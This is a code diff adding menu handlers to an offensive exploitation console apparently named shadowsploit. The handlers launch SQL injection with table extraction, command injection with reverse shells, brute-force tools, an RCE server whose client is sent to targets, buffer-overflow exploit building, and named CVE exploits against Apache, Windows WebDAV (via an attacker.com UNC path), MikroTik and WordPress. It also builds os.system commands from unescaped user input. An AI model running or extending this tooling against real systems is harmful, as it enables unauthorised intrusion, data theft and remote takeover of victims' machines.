+        sitesqlinjector()
+    elif scconsole155 == "run" or scconsole155 == "exploit":
+        targetwebs = input("Enter target URL: ")
+        websiteparameter = input("Enter one parameter to test: ")
+        websitemethod = input("Enter the method(GET or POST): ")
+        if websitemethod == "POST":
+            parameterdata = input("Enter the DATA: ")
+            os.system(f'python exploits/site/sql_injector.py "{targetwebs}" {websiteparameter} --method {websitemethod} --data "{parameterdata}"')
+            print("\n[+] Starting to extract tables\n")
+            os.system(f'python exploits/site/sql_injector.py "{targetwebs}" {websiteparameter} --method {websitemethod} --data "{parameterdata}" --extract-tables')
+            print("\n\n")
+            tablenametoextract = input("Enter the table name to extract columns(if finded): ")
+            os.system(f'python exploits/site/sql_injector.py "{targetwebs}" {websiteparameter} --method {websitemethod} --data "{parameterdata}" --extract-columns {tablenametoextract}')
+            sitesqlinjector()
+        else:
+            os.system(f'python exploits/site/sql_injector.py "{targetwebs}" {websiteparameter} --method {websitemethod}')
+            print("\n[+] Starting to extract tables\n")
+            os.system(f'python exploits/site/sql_injector.py "{targetwebs}" {websiteparameter} --method {websitemethod} --extract-tables')
+            print("\n\n")
+            tablenametoextract = input("Enter the table name to extract columns(if finded): ")
+            os.system(f'python exploits/site/sql_injector.py "{targetwebs}" {websiteparameter} --method {websitemethod} --extract-columns {tablenametoextract}')
+            sitesqlinjector()
+    elif scconsole155 == "unuse":
+        print("unusing site/sql_injector.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole155 == "exit":
+        exit()
+    else:
+        print("There is no command or option like that!\nunusing ...")
+        time.sleep(0.5)
+        Console()
+
+def sitecmdinjector():
+    scconsole156 = input("sc~" + color.red + "(site/cmd_injector)" + color.white + ">")
+    if scconsole156 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        sitecmdinjector()
+    elif scconsole156 == "clear":
+        os.system('clear')
+        sitecmdinjector()
+    elif scconsole156 == "show options":
+        print("""
+OPTIONS          | DISCREPTIONS
+-----------------|----------------------
+URL              | specify the target url (example: https://example.com/vuln.php).
+PARAMETER        | specify the parameter(if GET specify that GET parameter: id , if POST use 'find-login-fields' module to extract the parameters and specify just one of them: username).
+METHOD           | specify the method GET or POST.
+DATA (IF POST)   | if method is POST, specify the parameters and put the values as 'value' (example: username=value&passwd=value2&submit).
+MODE             | specify the mode (test: just to test the OS Command Injection, shell: to get a shell from target website, reverse: to get a reverse shell but before running this you need to run a listener).
+
+LHOST            | if mode is 'reverse' specify your ip address for listener.
+LPORT            | if mode is 'reverse' specify your port for listener.
+TARGET_OS        | if mode is 'reverse' specify target OS to use payloads for that OS(linux or windows).
+
+you will specifiy these options when you run or exploit it!
+""")
+        sitecmdinjector()
+    elif scconsole156 == "run" or scconsole156 == "exploit":
+        targetwebs2 = input("Enter target URL: ")
+        websiteparameter2 = input("Enter one parameter to test: ")
+        testmode = input("Enter the mode(test or shell or reverse): ")
+        websitemethod2 = input("Enter the method(GET or POST): ")
+        if testmode == "test" and websitemethod2 == "POST":
+            parameterdata2 = input("Enter the DATA: ")
+            os.system(f'python exploits/site/cmd_injector.py {targetwebs2} {websiteparameter2} --method {websitemethod2} --data "{parameterdata2}" --mode test')
+            sitecmdinjector()
+        elif testmode == "test" and websitemethod2 == "GET":
+            os.system(f'python exploits/site/cmd_injector.py {targetwebs2} {websiteparameter2} --method {websitemethod2} --mode test')
+            sitecmdinjector()
+        elif testmode =="shell":
+            os.system(f'python exploits/site/cmd_injector.py {targetwebs2} {websiteparameter2} --mode shell')
+            sitecmdinjector()
+        elif testmode =="reverse":
+            youripadd = input("Enter your IP Address for listener: ")
+            yourport = input("Enter your port for listener: ")
+            targetos = input("Enter target os to run a reverse shell payload on it(linux or windows): ")
+            os.system(f'python exploits/site/cmd_injector.py {targetwebs2} {websiteparameter2} --mode reverse --lhost {youripadd} --lport {yourport} --os {targetos}')
+            sitecmdinjector()
+        else:
+            print("[-] There is no option like That!\n")
+            sitecmdinjector()
+    elif scconsole156 == "unuse":
+        print("unusing site/cmd_injector.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole156 == "exit":
+        exit()
+    else:
+        print("There is no command or option like that!\nunusing ...")
+        time.sleep(0.5)
+        Console()
+
+def sitelfirfiscanner():
+    scconsole157 = input("sc~" + color.red + "(site/lfi_rfi_scanner)" + color.white + ">")
+    if scconsole157 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        sitelfirfiscanner()
+    elif scconsole157 == "clear":
+        os.system('clear')
+        sitelfirfiscanner()
+    elif scconsole157 == "show options":
+        print("""
+OPTIONS          | DISCREPTIONS
+-----------------|----------------------
+URL              | specify the target url (example: https://example.com/vuln.php?file=).
+PARAMETER        | specify the parameter(if GET specify that GET parameter: id , if POST use 'find-login-fields' module to extract the parameters and specify just one of them: username).
+METHOD           | specify the method GET or POST.
+DATA (IF POST)   | if method is POST, specify the parameters and put the values as 'value' (example: username=value&passwd=value2&submit).
+
+you will specifiy these options when you run or exploit it!
+""")
+        sitelfirfiscanner()
+    elif scconsole157 == "run" or scconsole157 == "exploit":
+        targeturlsite = input("Enter target URL: ")
+        urlparameter = input("Enter one parameter ot test: ")
+        urlmethod = input("Enter the method (GET or POST): ")
+        if urlmethod == "POST":
+            paramdata = input("Enter the DATA: ")
+            os.system(f'python exploits/site/lfi_rfi_scanner.py {targeturlsite} {urlparameter} --method POST --data "{paramdata}"')
+            sitelfirfiscanner()
+        elif urlmethod == "GET":
+            os.system(f'python exploits/site/lfi_rfi_scanner.py {targeturlsite} {urlparameter} --method GET')
+            sitelfirfiscanner()
+        else:
+            print("[-] There is no option like that!\n")
+            sitelfirfiscanner()
+    elif scconsole157 == "unuse":
+        print("unusing site/lfi_rfi_scanner.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole157 == "exit":
+        exit()
+    else:
+        print("There is no command or option like that!\nunusing ...")
+        time.sleep(0.5)
+        Console()
+        
+def sitexssscan():
+    scconsole158 = input("sc~" + color.red + "(site/xss_scan)" + color.white + ">")
+    if scconsole158 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        sitexssscan()
+    elif scconsole158 == "clear":
+        os.system('clear')
+        sitexssscan()
+    elif scconsole158 == "show options":
+        print("""
+OPTIONS          | DISCREPTIONS
+-----------------|----------------------
+URL              | specify the target url (example: https://example.com/vuln.php).
+PARAMETER        | specify the parameter(if GET specify that GET parameter: id , if POST use 'find-login-fields' module to extract the parameters and specify just one of them: username).
+METHOD           | specify the method GET or POST.
+DATA (IF POST)   | if method is POST, specify the parameters and put the values as 'value' (example: username=value&passwd=value2&submit).
+
+you will specifiy these options when you run or exploit it!
+""")
+        sitexssscan()
+    elif scconsole158 == "run" or scconsole158 == "exploit":
+        targeturlsite2 = input("Enter target URL: ")
+        urlparameter2 = input("Enter one parameter ot test: ")
+        urlmethod2 = input("Enter the method (GET or POST): ")
+        if urlmethod2 == "POST":
+            paramdata2 = input("Enter the DATA: ")
+            os.system(f'python exploits/site/xss_scan.py {targeturlsite2} {urlparameter2} --method POST --data "{paramdata2}"')
+            sitexssscan()
+        elif urlmethod2 == "GET":
+            os.system(f'python exploits/site/xss_scan.py {targeturlsite2} {urlparameter2} --method GET')
+            sitexssscan()
+        else:
+            print("[-] There is no option like that!\n")
+            sitexssscan()
+    elif scconsole158 == "unuse":
+        print("unusing site/xss_scan.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole158 == "exit":
+        exit()
+    else:
+        print("There is no command or option like that!\nunusing ...")
+        time.sleep(0.5)
+        Console()
+        
+def siteuploadfinder():
+    scconsole159 = input("sc~" + color.red + "(site/upload_finder)" + color.white + ">")
+    if scconsole159 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        siteuploadfinder()
+    elif scconsole159 == "clear":
+        os.system('clear')
+        siteuploadfinder()
+    elif scconsole159 == "show options":
+        print("""
+OPTIONS          | DISCREPTIONS
+-----------------|----------------------
+URL              | specify the target url (example: https://example.com).
+DEPTH            | specify crawl depth(default: 2).
+
+you will specifiy these options when you run or exploit it!
+""")
+        siteuploadfinder()
+    elif scconsole159 == "run" or scconsole159 == "exploit":
+        targeturlsite3 = input("Enter target URL: ")
+        crawldepth = int(input("Enter the crawl depth(default: 2): "))
+        os.system(f'python exploits/site/upload_finder.py {targeturlsite3} --depth {crawldepth}')
+        siteuploadfinder()
+    elif scconsole159 == "unuse":
+        print("unusing site/upload_finder.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole159 == "exit":
+        exit()
+    else:
+        print("There is no command or option like that!\nunusing ...")
+        time.sleep(0.5)
+        Console()
+        
+def auxiliaryftpbruteforce():
+    scconsole160 = input("sc~" + color.red + "(auxiliary/ftp_brute_force)" + color.white + ">")
+    if scconsole160 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        auxiliaryftpbruteforce()
+    elif scconsole160 == "clear":
+        os.system('clear')
+        auxiliaryftpbruteforce()
+    elif scconsole160 == "show options":
+        print("""
+OPTIONS          | DISCREPTIONS
+-----------------|----------------------
+RHOST            | specify target ip address.
+RPORT            | specify target ftp port (default 21).
+USERNAME         | specify target username.
+USERNAMELIST     | or specify the usernamelist.
+PASSWORDLIST     | specify the passwordlist.
+
+you will specifiy these options when you run or exploit it!
+""")
+        auxiliaryftpbruteforce()
+    elif scconsole160 == "run" or scconsole160 == "exploit":
+        os.system('python exploits/auxiliary/ftp_brute_force.py')
+        auxiliaryftpbruteforce()
+    elif scconsole160 == "unuse":
+        print("unusing auxiliary/ftp_brute_force.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole160 == "exit":
+        exit()
+    else:
+        print("There is no command or option like that!\nunusing ...")
+        time.sleep(0.5)
+        Console()
+        
+def multirceserver():
+    scconsole161 = input("sc~" + color.red + "(multi/rce_server)" + color.white + ">")
+    if scconsole161 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        multirceserver()
+    elif scconsole161 == "clear":
+        os.system('clear')
+        multirceserver()
+    elif scconsole161 == "show options":
+        print("""
+OPTIONS          | DISCREPTIONS
+-----------------|----------------------
+LHOST            | specified as '0.0.0.0'.
+LPORT            | specified as '9999'.
+
+you will specifiy these options when you run or exploit it!
+""")
+        multirceserver()
+    elif scconsole161 == "run" or scconsole161 == "exploit":
+        print("[!] Send 'rce_client.py' from 'shadowsploit/payloads/rce_client.py' to your target.")
+        os.system('python exploits/multi/rce_server.py')
+        multirceserver()
+    elif scconsole161 == "unuse":
+        print("unusing multi/rce_server.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole161 == "exit":
+        exit()
+    else:
+        print("There is no command or option like that!\nunusing ...")
+        time.sleep(0.5)
+        Console()
+        
+def windowsExelPasswordRecovery():
+    scconsole162 = input("sc~" + color.red + "(windows/Exel_Password_Recovery)" + color.white + ">")
+    if scconsole162 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        windowsExelPasswordRecovery()
+    elif scconsole162 == "clear":
+        os.system('clear')
+        windowsExelPasswordRecovery()
+    elif scconsole162 == "show options":
+        print("""
+THERE IS NO OPTIONS OR ANY DISCREPTIONS!
+
+Steps to Produce the Crash: 
+ 1. Run or Exploit
+ 2. Open EVIL.txt and copy content to clipboard
+ 3. Open Excel Password Recovery Professional
+ 4. Paste the content of EVIL.txt into the field: 'E-Mail and Registrations Code'
+ 5. Click 'Register' and you will see a crash.
+""")
+        windowsExelPasswordRecovery()
+    elif scconsole162 == "run" or scconsole162 == "exploit":
+        os.system('python exploits/windows/Exel_Password_Recovery.py')
+        windowsExelPasswordRecovery()
+    elif scconsole162 == "unuse":
+        print("unusing windows/Exel_Password_Recovery.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole162 == "exit":
+        exit()
+    else:
+        print("There is no command or option like that!\nunusing ...")
+        time.sleep(0.5)
+        Console()
+
+def scannerWAFChecker():
+    scconsole163 = input("sc~" + color.red + "(scanner/WAF_Checker)" + color.white + ">")
+    if scconsole163 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        scannerWAFChecker()
+    elif scconsole163 == "clear":
+        os.system('clear')
+        scannerWAFChecker()
+    elif scconsole163 == "show options":
+        print("""
+OPTIONS          | DISCREPTIONS
+-----------------|----------------------
+URL              | specify target url.
+
+you will specifiy these options when you run or exploit it!
+""")
+        scannerWAFChecker()
+    elif scconsole163 == "run" or scconsole163 == "exploit":
+        os.system('python exploits/scanner/WAF_Checker.py')
+        scannerWAFChecker()
+    elif scconsole163 == "unuse":
+        print("unusing scanner/WAF_Checker.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole163 == "exit":
+        exit()
+    else:
+        print("There is no command or option like that!\nunusing ...")
+        time.sleep(0.5)
+        Console()
+        
+def multilistener():
+    scconsole164 = input("sc~" + color.red + "(multi/listener)" + color.white + ">")
+    if scconsole164 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        multilistener()
+    elif scconsole164 == "clear":
+        os.system('clear')
+        multilistener()
+    elif scconsole164 == "show options":
+        print("""
+OPTIONS          | DISCREPTIONS
+-----------------|----------------------
+LPORT            | specify the listening port.
+
+you will specifiy these options when you run or exploit it!
+""")
+        multilistener()
+    elif scconsole164 == "run" or scconsole164 == "exploit":
+        listeningport = input("LPORT: ")
+        os.system(f'python exploits/multi/listener.py -p {listeningport}')
+        multilistener()
+    elif scconsole164 == "unuse":
+        print("unusing multi/listener.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole164 == "exit":
+        exit()
+    else:
+        print("There is no command or option like that!\nunusing ...")
+        time.sleep(0.5)
+        Console()
+        
+def bufferoverflowfuzzerbasic():
+    scconsole165 = input("sc~" + color.red + "(buffer_overflow/fuzzer_basic)" + color.white + ">")
+    if scconsole165 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        bufferoverflowfuzzerbasic()
+    elif scconsole165 == "clear":
+        os.system('clear')
+        bufferoverflowfuzzerbasic()
+    elif scconsole165 == "show options":
+        print("""
+OPTIONS          | DISCREPTIONS
+-----------------|----------------------
+RHOST            | specify target ip address.
+RPORT            | specify target vulnerable port(or open port).
+
+you will specifiy these options when you run or exploit it!
+""")
+        bufferoverflowfuzzerbasic()
+    elif scconsole165 == "run" or scconsole165 == "exploit":
+        os.system('python exploits/buffer_overflow/fuzzer_basic.py')
+        bufferoverflowfuzzerbasic()
+    elif scconsole165 == "unuse":
+        print("unusing buffer_overflow/fuzzer_basic.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole165 == "exit":
+        exit()
+    else:
+        print("There is no command or option like that!\nunusing ...")
+        time.sleep(0.5)
+        Console()
+        
+def bufferoverflowfuzzerpattern():
+    scconsole166 = input("sc~" + color.red + "(buffer_overflow/fuzzer_pattern)" + color.white + ">")
+    if scconsole166 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        bufferoverflowfuzzerpattern()
+    elif scconsole166 == "clear":
+        os.system('clear')
+        bufferoverflowfuzzerpattern()
+    elif scconsole166 == "show options":
+        print("""
+OPTIONS          | DISCREPTIONS
+-----------------|----------------------
+RHOST            | specify target ip address.
+RPORT            | specify target vulnerable port(or open port).
+PATTERN_LENGTH   | specify the pattern length(e.g., 3000).
+
+you will specifiy these options when you run or exploit it!
+""")
+        bufferoverflowfuzzerpattern()
+    elif scconsole166 == "run" or scconsole166 == "exploit":
+        os.system('python exploits/buffer_overflow/fuzzer_pattern.py')
+        bufferoverflowfuzzerpattern()
+    elif scconsole166 == "unuse":
+        print("unusing buffer_overflow/fuzzer_pattern.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole166 == "exit":
+        exit()
+    else:
+        print("There is no command or option like that!\nunusing ...")
+        time.sleep(0.5)
+        Console()
+        
+def bufferoverflowfindoffsec():
+    scconsole167 = input("sc~" + color.red + "(buffer_overflow/find_offsec)" + color.white + ">")
+    if scconsole167 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        bufferoverflowfindoffsec()
+    elif scconsole167 == "clear":
+        os.system('clear')
+        bufferoverflowfindoffsec()
+    elif scconsole167 == "show options":
+        print("""
+OPTIONS          | DISCREPTIONS
+-----------------|----------------------
+EIP_VALUE        | specify the eip value(e.g., 39694438).
+
+you will specifiy these options when you run or exploit it!
+""")
+        bufferoverflowfindoffsec()
+    elif scconsole167 == "run" or scconsole167 == "exploit":
+        os.system('python exploits/buffer_overflow/find_offsec.py')
+        bufferoverflowfindoffsec()
+    elif scconsole167 == "unuse":
+        print("unusing buffer_overflow/find_offsec.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole167 == "exit":
+        exit()
+    else:
+        print("There is no command or option like that!\nunusing ...")
+        time.sleep(0.5)
+        Console()
+        
+def bufferoverflowbufferoverflowexploitbuilder():
+    scconsole168 = input("sc~" + color.red + "(buffer_overflow/buffer_overflow_exploit_builder)" + color.white + ">")
+    if scconsole168 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        bufferoverflowbufferoverflowexploitbuilder()
+    elif scconsole168 == "clear":
+        os.system('clear')
+        bufferoverflowbufferoverflowexploitbuilder()
+    elif scconsole168 == "show options":
+        print("""
+OPTIONS          | DISCREPTIONS
+-----------------|----------------------
+RHOST            | specify target ip address.
+RPORT            | specify target vulnerable port(or open port).
+OFFSEC           | specify the offsec to eip.
+JMP_ESP_ADDRESS  | specify the jmp esp address(little-endian, e.g., \\xaf\\x11\\x50\\x62).
+SHELLCODE        | specify the shellcode(you can generate it with 'scshellcodegenerator').
+
+you will specifiy these options when you run or exploit it!
+""")
+        bufferoverflowbufferoverflowexploitbuilder()
+    elif scconsole168 == "run" or scconsole168 == "exploit":
+        os.system('python exploits/buffer_overflow/buffer_overflow_exploit_builder.py')
+        bufferoverflowbufferoverflowexploitbuilder()
+    elif scconsole168 == "unuse":
+        print("unusing buffer_overflow/buffer_overflow_exploit_builder.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole168 == "exit":
+        exit()
+    else:
+        print("There is no command or option like that!\nunusing ...")
+        time.sleep(0.5)
+        Console()
+        
+def scannercsrftokendetect():
+    scconsole169 = input("sc~" + color.red + "(scanner/csrf_token_detect)" + color.white + ">")
+    if scconsole169 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        scannercsrftokendetect()
+    elif scconsole169 == "clear":
+        os.system('clear')
+        scannercsrftokendetect()
+    elif scconsole169 == "show options":
+        print("""
+OPTIONS          | DISCREPTIONS
+-----------------|----------------------
+URL              | specify target form url.
+
+you will specifiy these options when you run or exploit it!
+""")
+        scannercsrftokendetect()
+    elif scconsole169 == "run" or scconsole169 == "exploit":
+        os.system('python exploits/scanner/csrf_token_detect.py')
+        scannercsrftokendetect()
+    elif scconsole169 == "unuse":
+        print("unusing scanner/csrf_token_detect.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole169 == "exit":
+        exit()
+    else:
+        print("There is no command or option like that!\nunusing ...")
+        time.sleep(0.5)
+        Console()
+        
+def auxiliaryhttpsbruteforce():
+    scconsole170 = input("sc~" + color.red + "(auxiliary/https_brute_force)" + color.white + ">")
+    if scconsole170 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        auxiliaryhttpsbruteforce()
+    elif scconsole170 == "clear":
+        os.system('clear')
+        auxiliaryhttpsbruteforce()
+    elif scconsole170 == "show options":
+        print("""
+OPTIONS          | DISCREPTIONS
+-----------------|----------------------
+URL              | specify login url.
+USER_FIELD       | specify the username field name.
+PASS_FIELD       | specify the password field name.
+USERNAME         | specify the username for brute-force.
+USERNAMELIST     | of specify the usernamelist.
+PASSWORDLIST     | specify the passwordlist.
+SUCCESS          | specify teh keyword that appears on successful login.
+
+you will specifiy these options when you run or exploit it!
+""")
+        auxiliaryhttpsbruteforce()
+    elif scconsole170 == "run" or scconsole170 == "exploit":
+        os.system('python exploits/auxiliary/https_brute_force.py')
+        auxiliaryhttpsbruteforce()
+    elif scconsole170 == "unuse":
+        print("unusing auxiliary/https_brute_force.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole170 == "exit":
+        exit()
+    else:
+        print("There is no command or option like that!\nunusing ...")
+        time.sleep(0.5)
+        Console()
+
+def windowswindowswebdavurlrcecve202533053():
+    scconsole171 = input("sc~" + color.red + "(windows/windows_webdav_url_rce_cve_2025_33053)" + color.white + ">")
+    if scconsole171 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        windowswindowswebdavurlrcecve202533053()
+    elif scconsole171 == "clear":
+        os.system('clear')
+        windowswindowswebdavurlrcecve202533053()
+    elif scconsole171 == "show options":
+        print("""
+OPTIONS          | DISCREPTIONS
+-----------------|----------------------
+OUTPUT           | specify path for generated .url file.
+BINARY           | specify trusted LOLBin to execute (default: iediagcmd.exe).
+UNC              | specify UNC WebDAV path hosting malicious executables (e.g., //attacker.com/DavWWWRoot).
+
+you will specifiy these options when you run or exploit it!
+""")
+        windowswindowswebdavurlrcecve202533053()
+    elif scconsole171 == "run" or scconsole171 == "exploit":
+        namefoutput = input("Path for generated .url file: ")
+        binary = input("Trusted LOLBin to execute (default: iediagcmd.exe): ")
+        unc = input("UNC WebDAV path hosting malicious executables (e.g., //attacker.com/DavWWWRoot): ")
+        os.system(f'python exploits/windows/windows_webdav_url_rce_cve_2025_33053.py -o {namefoutput} -b {binary} -u {unc}')
+        windowswindowswebdavurlrcecve202533053()
+    elif scconsole171 == "unuse":
+        print("unusing windows/windows_webdav_url_rce_cve_2025_33053.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole171 == "exit":
+        exit()
+    else:
+        print("There is no command or option like that!\nunusing ...")
+        time.sleep(0.5)
+        Console()
+        
+def sitecve202141773apacherce():
+    scconsole172 = input("sc~" + color.red + "(site/cve_2021_41773_apache_rce)" + color.white + ">")
+    if scconsole172 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        sitecve202141773apacherce()
+    elif scconsole172 == "clear":
+        os.system('clear')
+        sitecve202141773apacherce()
+    elif scconsole172 == "show options":
+        print("""
+OPTIONS          | DISCREPTIONS
+-----------------|----------------------
+URL              | specify target vulnerable Apache HTTP Server (Version 2.4.49) url (example: http://192.268.1.1:80).
+COMMAND          | specify the command to execute on target Apache server (example: whoami).
+
+you will specifiy these options when you run or exploit it!
+""")
+        sitecve202141773apacherce()
+    elif scconsole172 == "run" or scconsole172 == "exploit":
+        targetapachev = input("Enter target vulnerable Apache HTTP Server URL (e.g.: http://192.168.1.1:80): ")
+        commandtoapache = input("Enter command to execute in target server: ")
+        os.system(f'python exploits/site/cve_2021_41773_apache_rce.py {targetapachev}')
+        os.system(f'python exploits/site/cve_2021_41773_apache_rce.py {targetapachev} {commandtoapache}')
+        sitecve202141773apacherce()
+    elif scconsole172 == "unuse":
+        print("unusing site/cve_2021_41773_apache_rce.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole172 == "exit":
+        exit()
+    else:
+        print("There is no command or option like that!\nunusing ...")
+        time.sleep(0.5)
+        Console()
+
+def sitecve202142013apachebypassrce():
+    scconsole173 = input("sc~" + color.red + "(site/cve_2021_42013_apache_bypass_rce)" + color.white + ">")
+    if scconsole173 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        sitecve202142013apachebypassrce()
+    elif scconsole173 == "clear":
+        os.system('clear')
+        sitecve202142013apachebypassrce()
+    elif scconsole173 == "show options":
+        print("""
+OPTIONS          | DISCREPTIONS
+-----------------|----------------------
+URL              | specify target vulnerable Apache HTTP Server (Version 2.4.49) url (example: http://192.268.1.1:80).
+COMMAND          | specify the command to execute on target Apache server (example: whoami).
+
+you will specifiy these options when you run or exploit it!
+""")
+        sitecve202142013apachebypassrce()
+    elif scconsole173 == "run" or scconsole173 == "exploit":
+        targetapachev2 = input("Enter target vulnerable Apache HTTP Server URL (e.g.: http://192.168.1.1:80): ")
+        commandtoapache2 = input("Enter command to execute in target server: ")
+        os.system(f'python exploits/site/cve_2021_42013_apache_bypass_rce.py {targetapachev2} {commandtoapache2}')
+        sitecve202142013apachebypassrce()
+    elif scconsole173 == "unuse":
+        print("unusing site/cve_2021_42013_apache_bypass_rce.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole173 == "exit":
+        exit()
+    else:
+        print("There is no command or option like that!\nunusing ...")
+        time.sleep(0.5)
+        Console()
+        
+def auxiliarymikrotikrouteros7191xss():
+    scconsole174 = input("sc~" + color.red + "(auxiliary/mikrotik-routeros-7-19-1-xss)" + color.white + ">")
+    if scconsole174 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        auxiliarymikrotikrouteros7191xss()
+    elif scconsole174 == "clear":
+        os.system('clear')
+        auxiliarymikrotikrouteros7191xss()
+    elif scconsole174 == "show options":
+        print("""
+OPTIONS          | DISCREPTIONS
+-----------------|----------------------
+RHOST            | specify the target mikrotik ip address.
+PAYLOAD          | specify the xss payload (example: javascript:alert(3) )
+
+you will specifiy these options when you run or exploit it!
+""")
+        auxiliarymikrotikrouteros7191xss()
+    elif scconsole174 == "run" or scconsole174 == "exploit":
+        os.system('python exploits/auxiliary/mikrotik-routeros-7-19-1-xss.py')
+        auxiliarymikrotikrouteros7191xss()
+    elif scconsole174 == "unuse":
+        print("unusing auxiliary/mikrotik-routeros-7-19-1-xss.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole174 == "exit":
+        exit()
+    else:
+        print("There is no command or option like that!\nunusing ...")
+        time.sleep(0.5)
+        Console()
+        
+def sitefilelistwordpresspligun422():
+    scconsole175 = input("sc~" + color.red + "(site/file_list_wordpress_pligun_4-2-2)" + color.white + ">")
+    if scconsole175 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        sitefilelistwordpresspligun422()
+    elif scconsole175 == "clear":
+        os.system('clear')
+        sitefilelistwordpresspligun422()
+    elif scconsole175 == "show options":
+        print("""
+OPTIONS          | DISCREPTIONS
+-----------------|----------------------
+RHOSTS           | specify the target list.txt (create a list.txt and put your taregts in that).
+
+you will specifiy these options when you run or exploit it!
+""")
+        sitefilelistwordpresspligun422()
+    elif scconsole175 == "run" or scconsole175 == "exploit":
+        targetlist = input("Enter the name of the targets list (with .txt): ")
+        os.system(f'python exploits/site/file_list_wordpress_pligun_4-2-2.py {targetlist}')
+        sitefilelistwordpresspligun422()
+    elif scconsole175 == "unuse":
+        print("unusing site/file_list_wordpress_pligun_4-2-2.")
